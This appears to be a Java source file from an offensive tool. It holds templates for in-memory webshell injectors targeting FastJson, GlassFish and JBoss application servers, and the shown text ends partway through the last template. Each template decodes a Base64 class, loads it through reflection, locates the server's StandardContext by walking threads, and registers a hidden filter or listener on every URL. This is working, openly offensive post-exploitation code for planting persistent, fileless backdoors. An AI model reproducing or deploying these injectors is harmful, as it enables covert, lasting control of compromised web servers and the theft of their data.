package core.memshellstr;

public class ConstantTemplate {

    public static final String FastJsonFilterMemShell =
            "public class FastJsonFilterMemShell extends ClassLoader {\n" +
            "    static {\n" +
            "        try {\n" +
            "            new FastJsonFilterMemShell();\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public FastJsonFilterMemShell() throws Exception {\n" +
            "        super(Thread.currentThread().getContextClassLoader());\n" +
            "        String byteString = \"\";\n" +
            "        byte[] bytes = base64Decode(byteString);\n" +
            "        Class clazz = (Class) super.defineClass(bytes, 0, bytes.length).newInstance();\n" +
            "    }\n" +
            "}\n";

    public static final String FastJsonListenerMemShell =
            "public class FastJsonListenerMemShell extends ClassLoader{\n" +
            "    static {\n" +
            "        try {\n" +
            "            new FastJsonListenerMemShell();\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public FastJsonListenerMemShell() throws Exception {\n" +
            "        super(Thread.currentThread().getContextClassLoader());\n" +
            "        String byteString = \"\";\n" +
            "        byte[] bytes = base64Decode(byteString);\n" +
            "        Class clazz = (Class) super.defineClass(bytes, 0, bytes.length).newInstance();\n" +
            "    }\n" +
            "\n" +
            "}\n";

    public static final String GlassFishFilterMemShell =
                "import java.lang.reflect.Constructor;\n" +
                "import java.lang.reflect.Field;\n" +
                "import java.lang.reflect.Method;\n" +
                "import java.util.HashMap;\n" +
                "import java.util.List;\n" +
                "\n" +
                "public class GlassFishFilterMemShell {\n" +
                "\n" +
                "    static {\n" +
                "        Inject();\n" +
                "    }\n" +
                "\n" +
                "    public GlassFishFilterMemShell() {\n" +
                "        Inject();\n" +
                "    }\n" +
                "\n" +
                "    public static synchronized void Inject() {\n" +
                "        String filterName = \"memshell.GlassFilterShell\";\n" +
                "        String urlPattern = \"/*\";\n" +
                "        try {\n" +
                "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                "            String ListenerBase64 = \"\";\n" +
                "            byte[] FilterClass = base64Decode(ListenerBase64);\n" +
                "\n" +
                "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                "            defineClass1.setAccessible(true);\n" +
                "            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);\n" +
                "\n" +
                "            Object filterObject = (Object) filterClass.newInstance();\n" +
                "\n" +
                "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
                "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
                "            f1.setAccessible(true);\n" +
                "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
                "\n" +
                "            for (Thread thread : threads) {\n" +
                "                try {\n" +
                "                    char[] charArray = (char[]) getFV(thread, \"name\");\n" +
                "                    String chars = String.valueOf(charArray);\n" +
                "\n" +
                "                    if (chars.contains(\"ContainerBackgroundProcessor\") && chars.matches(\".*StandardContext\\\\[/.+\\\\]\")) {\n" +
                "                        Object target = getFV(thread, \"target\");\n" +
                "                        Object this0 = getFV(target, \"this$0\");\n" +
                "\n" +
                "                        Method mf = this0.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"findFilterConfig\", String.class);\n" +
                "                        mf.setAccessible(true);\n" +
                "                        if (mf.invoke(this0, filterName) == null) {\n" +
                "                            Constructor<?>[] consFilterDef = Class.forName(\"org.apache.catalina.deploy.FilterDef\").getDeclaredConstructors();\n" +
                "                            consFilterDef[0].setAccessible(true);\n" +
                "                            Object filterDef = consFilterDef[0].newInstance();\n" +
                "                            Method m2 = filterDef.getClass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
                "                            m2.setAccessible(true);\n" +
                "                            m2.invoke(filterDef, filterName);\n" +
                "                            Method m3 = filterDef.getClass().getDeclaredMethod(\"setFilter\", filterObject.getClass());\n" +
                "                            m3.setAccessible(true);\n" +
                "                            m3.invoke(filterDef, filterObject);\n" +
                "                            Constructor<?>[] consFilterConfig = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\").getDeclaredConstructors();\n" +
                "                            consFilterConfig[0].setAccessible(true);\n" +
                "                            Object config = consFilterConfig[0].newInstance(this0, filterDef);\n" +
                "\n" +
                "                            Constructor<?>[] consFilterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\").getDeclaredConstructors();\n" +
                "                            consFilterMap[0].setAccessible(true);\n" +
                "                            Object filterMap = consFilterMap[0].newInstance();\n" +
                "                            Method m4 = filterMap.getClass().getDeclaredMethod(\"setFilterName\", String.class);\n" +
                "                            m4.setAccessible(true);\n" +
                "                            m4.invoke(filterMap, filterName);\n" +
                "                            Method m5 = filterMap.getClass().getDeclaredMethod(\"setURLPattern\", String.class);\n" +
                "                            m5.setAccessible(true);\n" +
                "                            m5.invoke(filterMap, urlPattern);\n" +
                "                            HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFV(this0, \"filterConfigs\");\n" +
                "                            filterConfigs.put(filterName, config);\n" +
                "                            List object = (List) getFV(this0, \"filterMaps\");\n" +
                "                            object.add(filterMap);\n" +
                "                        }\n" +
                "\n" +
                "                    }\n" +
                "                } catch (Exception e) {\n" +
                "                    System.out.println(e);\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "\n" +
                "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                "        Field var2 = null;\n" +
                "        Class var3 = var0.getClass();\n" +
                "\n" +
                "        while (var3 != Object.class) {\n" +
                "            try {\n" +
                "                var2 = var3.getDeclaredField(var1);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException var5) {\n" +
                "                var3 = var3.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (var2 == null) {\n" +
                "            throw new NoSuchFieldException(var1);\n" +
                "        } else {\n" +
                "            var2.setAccessible(true);\n" +
                "            return var2.get(var0);\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                "        byte[] value = null;\n" +
                "\n" +
                "        Class base64;\n" +
                "        try {\n" +
                "            base64 = Class.forName(\"java.util.Base64\");\n" +
                "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                "        } catch (Exception var6) {\n" +
                "            try {\n" +
                "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "                Object decoder = base64.newInstance();\n" +
                "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                "            } catch (Exception var5) {\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        return value;\n" +
                "    }\n" +
                "}\n";

    public static final String GlassFishListenerMemShell =
                    "import java.lang.reflect.Field;\n" +
                    "import java.lang.reflect.Method;\n" +
                    "import java.util.EventListener;\n" +
                    "import java.util.List;\n" +
                    "\n" +
                    "public class GlassFishListenerMemShell {\n" +
                    "    static {\n" +
                    "        Inject();\n" +
                    "    }\n" +
                    "\n" +
                    "    public GlassFishListenerMemShell() {\n" +
                    "        Inject();\n" +
                    "    }\n" +
                    "\n" +
                    "    public static synchronized void Inject() {\n" +
                    "        try {\n" +
                    "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                    "            String ListenerBase64 = \"\";\n" +
                    "            byte[] ListenerClass = base64Decode(ListenerBase64);\n" +
                    "\n" +
                    "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                    "            defineClass1.setAccessible(true);\n" +
                    "            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);\n" +
                    "\n" +
                    "            EventListener listenerObject = (EventListener) listenerClass.newInstance();\n" +
                    "\n" +
                    "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
                    "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
                    "            f1.setAccessible(true);\n" +
                    "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
                    "\n" +
                    "            for (Thread thread : threads) {\n" +
                    "                try {\n" +
                    "                    char[] chararray = (char[]) getFV(thread, \"name\");\n" +
                    "                    String chars = String.valueOf(chararray);\n" +
                    "\n" +
                    "                    if (chars.contains(\"ContainerBackgroundProcessor\") && chars.matches(\".*StandardContext\\\\[/.+\\\\]\")) {\n" +
                    "                        Object target = getFV(thread, \"target\");\n" +
                    "                        Object this0 = getFV(target, \"this$0\");\n" +
                    "\n" +
                    "                        Method m2 = this0.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"getApplicationEventListeners\");\n" +
                    "                        m2.setAccessible(true);\n" +
                    "                        List<EventListener> eventlisteners = (List<EventListener>) m2.invoke(this0);\n" +
                    "                        eventlisteners.add(listenerObject);\n" +
                    "                    }\n" +
                    "                } catch (Exception e) {\n" +
                    "                }\n" +
                    "            }\n" +
                    "        } catch (Exception e) {\n" +
                    "\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                    "        Field var2 = null;\n" +
                    "        Class var3 = var0.getClass();\n" +
                    "\n" +
                    "        while (var3 != Object.class) {\n" +
                    "            try {\n" +
                    "                var2 = var3.getDeclaredField(var1);\n" +
                    "                break;\n" +
                    "            } catch (NoSuchFieldException var5) {\n" +
                    "                var3 = var3.getSuperclass();\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        if (var2 == null) {\n" +
                    "            throw new NoSuchFieldException(var1);\n" +
                    "        } else {\n" +
                    "            var2.setAccessible(true);\n" +
                    "            return var2.get(var0);\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                    "        byte[] value = null;\n" +
                    "\n" +
                    "        Class base64;\n" +
                    "        try {\n" +
                    "            base64 = Class.forName(\"java.util.Base64\");\n" +
                    "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                    "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                    "        } catch (Exception var6) {\n" +
                    "            try {\n" +
                    "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                    "                Object decoder = base64.newInstance();\n" +
                    "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                    "            } catch (Exception var5) {\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        return value;\n" +
                    "    }\n" +
                    "}\n";

    public static final String JBossFilterMemShell =
            "import java.lang.reflect.*;\n" +
            "import java.util.*;\n" +
            "\n" +
            "public class JBossFilterMemShell{\n" +
            "    private static ArrayList StanderContexts = new ArrayList();\n" +
            "    private static String FilterName = \"memshell.JBossFilterShell\";\n" +
            "    public static Object request;\n" +
            "    static{\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public JBossFilterMemShell(){\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void Inject(){\n" +
            "        getContext4();\n" +
            "        getContext5And6();\n" +
            "        Iterator var1 = StanderContexts.iterator();\n" +
            "        IMC();\n" +
            "        while (var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            if (!isInjected(var2)){\n" +
            "                IMF(var2);}\n" +
            "        }\n" +
            "    }\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext4() {\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                Object Endpoint = null;\n" +
            "                if (thread.getName().startsWith(\"http-\")) {\n" +
            "                    Object tmp = getFV(thread, \"target\");\n" +
            "                    if (tmp.getClass().getName().contains(\"PoolTcpEndpoint\")) {\n" +
            "                        Endpoint = tmp;\n" +
            "                    } else {\n" +
            "                        try {\n" +
            "                            Endpoint = getFV(tmp, \"endpoint\");\n" +
            "                        } catch (Exception e) {\n" +
            "                            Object toRun = getFV(tmp, \"toRun\");\n" +
            "                            if (toRun != null){\n" +
            "                                Endpoint = getFV(toRun, \"endpoint\");}\n" +
            "                        }\n" +
            "                    }\n" +
            "                    if (Endpoint != null) {\n" +
            "                        Object Http11Protocol = getFV(Endpoint, \"handler\");\n" +
            "                        Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                        List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                        for (int i = 0; i < Processors.size(); i++) {\n" +
            "                            Object RequestInfo = (Object) Processors.get(i);\n" +
            "                            Object Request = getFV(RequestInfo, \"req\");\n" +
            "                            Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                            Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                            f4.setAccessible(true);\n" +
            "                            StandardContext = f4.get(Request1);\n" +
            "                            if (StandardContext != null) {\n" +
            "                                request = Request;\n" +
            "                                StanderContexts.add(StandardContext);\n" +
            "                                break;\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }}\n" +
            "            }\n" +
            "\n" +
            "        }catch(Exception e){}\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext5And6() {\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                if (thread.getName().contains(\"Acceptor\") && thread.getName().contains(\"http\")) {\n" +
            "                    Object JioEndpoint$ = getFV(thread, \"target\");\n" +
            "                    Object JioEndpointO = getFV(JioEndpoint$, \"this$0\");\n" +
            "                    Object Http11Protocol = getFV(JioEndpointO, \"handler\");\n" +
            "                    Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                    List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                    for (int i = 0; i < Processors.size(); i++) {\n" +
            "                        Object RequestInfo = (Object) Processors.get(i);\n" +
            "                        Object Request = getFV(RequestInfo, \"req\");\n" +
            "                        Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                        Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                        f4.setAccessible(true);\n" +
            "                        StandardContext = f4.get(Request1);\n" +
            "                        if (StandardContext != null) {\n" +
            "                            request = Request;\n" +
            "                            StanderContexts.add(StandardContext);\n" +
            "                            break;\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized boolean isInjected(Object STANDARD_CONTEXT) {\n" +
            "        try {\n" +
            "            Map map = (Map) getFV(STANDARD_CONTEXT, \"filterDefs\");\n" +
            "            Set set = map.keySet();\n" +
            "            Iterator it = set.iterator();\n" +
            "            while (it.hasNext()){\n" +
            "                Object o = it.next();\n" +
            "                if (o.toString().contains(FilterName)){\n" +
            "                    return true;\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return false;\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized void IMF(Object STANDARD_CONTEXT) {\n" +
            "        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "\n" +
            "\n" +
            "        try {\n" +
            "            Object filter = (Object) Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();\n" +
            "            Class<?> FilterDefClass = null;\n" +
            "            Class<?> Context = null;\n" +
            "            try {\n" +
            "                Context = classLoader.loadClass(\"org.apache.catalina.Context\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "            try {\n" +
            "                FilterDefClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterDef\");\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "\n" +
            "            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();\n" +
            "            FilterDefCons.setAccessible(true);\n" +
            "            Object filterDef = FilterDefCons.newInstance();\n" +
            "            invoke(filterDef, \"setFilterName\", FilterName);\n" +
            "            invoke(filterDef, \"setFilterClass\", filter.getClass().getName());\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterDef\", filterDef);\n" +
            "\n" +
            "            Class<?> filterMapClass = null;\n" +
            "            try {\n" +
            "                filterMapClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterMap\");\n" +
            "            } catch (Exception e) {\n" +
            "\n" +
            "            }\n" +
            "            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();\n" +
            "            FilterMapCons.setAccessible(true);\n" +
            "            Object FilterMapObj = FilterMapCons.newInstance();\n" +
            "            invoke(FilterMapObj, \"addURLPattern\", \"/*\");  // version 6\n" +
            "            invoke(FilterMapObj, \"setURLPattern\", \"/*\"); // version 4\n" +
            "            invoke(FilterMapObj, \"setFilterName\", FilterName);\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterMap\", FilterMapObj);\n" +
            "\n" +
            "            Class<?> ApplicationFilterConfigClass = classLoader.loadClass(\"org.apache.catalina.core.ApplicationFilterConfig\");\n" +
            "            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);\n" +
            "            ApplicationFilterCons.setAccessible(true);\n" +
            "            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);\n" +
            "\n" +
            "            Field getAppFilterConfigs = STANDARD_CONTEXT.getClass().getDeclaredField(\"filterConfigs\");\n" +
            "            getAppFilterConfigs.setAccessible(true);\n" +
            "            Map filterConfigs = (Map) getAppFilterConfigs.get(STANDARD_CONTEXT);\n" +
            "            filterConfigs.put(FilterName, ApplicationfilterObj);\n" +
            "\n" +
            "        } catch (Throwable var16) {\n" +
            "\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    private static Object invoke(Object obj, String methodName, Object... parameters) {\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters != null) {\n" +
            "                for (int i = 0; i < parameters.length; ++i) {\n" +
            "                    Object o1 = parameters[i];\n" +
            "                    if (o1 != null) {\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    } else {\n" +
            "                        classes.add((Object) null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        } catch (Exception var7) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(FilterName);\n" +
            "        } catch (Exception var4) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "//                byte[] var2 = base64Decode(\"\");\n" +
            "                byte[] var2 = base64Decode(\"\");\n" +
            "                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "            } catch (Throwable var3) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "}\n";

    public static final String JBossListenerMemShell =
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.List;\n" +
            "\n" +
            "public class JBossListenerMemShell {\n" +
            "    private static ArrayList StanderContexts = new ArrayList();\n" +
            "    static {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public JBossListenerMemShell() {\n" +
            "\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "\n" +
            "\n" +
            "    public static synchronized void Inject() {\n" +
            "        getContext1();\n" +
            "        getContext();\n" +
            "        Iterator var1 = StanderContexts.iterator();\n" +
            "        while (var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            IMF(var2);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext1() {\n" +
            "        ArrayList var0 = new ArrayList();\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                if (thread.getName().startsWith(\"http-\")) {\n" +
            "                    Object Endpoint = null;\n" +
            "\n" +
            "                    Object tmp =  getFV(thread, \"target\");\n" +
            "                    if (tmp.getClass().getName().contains(\"PoolTcpEndpoint\")){\n" +
            "                        Endpoint = tmp;\n" +
            "                    }\n" +
            "                    else{\n" +
            "                        Endpoint = getFV(tmp, \"endpoint\");\n" +
            "                    }\n" +
            "                    Object Http11Protocol = getFV(Endpoint, \"handler\");\n" +
            "                    Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                    List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                    for (int i = 0; i < Processors.size(); i++) {\n" +
            "                        Object RequestInfo = (Object) Processors.get(i);\n" +
            "                        Object Request = getFV(RequestInfo, \"req\");\n" +
            "                        Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                        Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                        f4.setAccessible(true);\n" +
            "                        StandardContext = f4.get(Request1);\n" +
            "                        if (StandardContext != null) {\n" +
            "                            StanderContexts.add(StandardContext);\n" +
            "                            break;\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "        }catch(Exception e){}\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext() {\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                if (thread.getName().contains(\"Acceptor\") && thread.getName().contains(\"http\")) {\n" +
            "                    Object JioEndpoint$ = getFV(thread, \"target\");\n" +
            "                    Object JioEndpointO = getFV(JioEndpoint$, \"this$0\");\n" +
            "                    Object Http11Protocol = getFV(JioEndpointO, \"handler\");\n" +
            "                    Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                    List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                    for (int i = 0; i < Processors.size(); i++) {\n" +
            "                        Object RequestInfo = (Object) Processors.get(i);\n" +
            "                        Object Request = getFV(RequestInfo, \"req\");\n" +
            "                        Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                        Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                        f4.setAccessible(true);\n" +
            "                        StandardContext = f4.get(Request1);\n" +
            "                        if (StandardContext != null) {\n" +
            "                            StanderContexts.add(StandardContext);\n" +
            "                            break;\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMF(Object var1) {\n" +
            "        try {\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            String ListenerBase64 = \"\";\n" +
            "            byte[] ListenerClass = base64Decode(ListenerBase64);\n" +
            "\n" +
            "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass1.setAccessible(true);\n" +
            "\n" +
            "            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);\n" +
            "\n" +
            "            Object listenerObject = (Object) listenerClass.newInstance();\n" +
            "            Method m1 = var1.getClass().getDeclaredMethod(\"getApplicationEventListeners\");\n" +
            "            m1.setAccessible(true);\n" +
            "            Object[] al = (Object[]) m1.invoke(var1);\n" +
            "            Object[] tempArr = new Object[al.length + 1];\n" +
            "            System.arraycopy(al, 0, tempArr, 0, al.length);\n" +
            "            tempArr[al.length] = listenerObject;\n" +
            "            Method m2 = var1.getClass().getDeclaredMethod(\"setApplicationEventListeners\", Object[].class);\n" +
            "            m2.setAccessible(true);\n" +
            "            m2.invoke(var1, new Object[]{tempArr});\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
